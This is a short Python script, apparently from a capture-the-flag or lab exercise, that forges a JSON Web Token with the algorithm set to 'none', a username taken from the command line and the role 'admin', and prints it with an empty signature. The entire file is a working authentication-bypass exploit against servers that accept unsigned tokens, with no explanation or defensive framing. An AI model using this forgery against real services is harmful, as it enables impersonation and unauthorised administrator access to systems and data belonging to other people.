import base64
import json
import sys


def b64url(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


username = sys.argv[1] if len(sys.argv) > 1 else "qwerty123"
header = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"sub": username, "role": "admin"})
print(f"{header}.{payload}.")
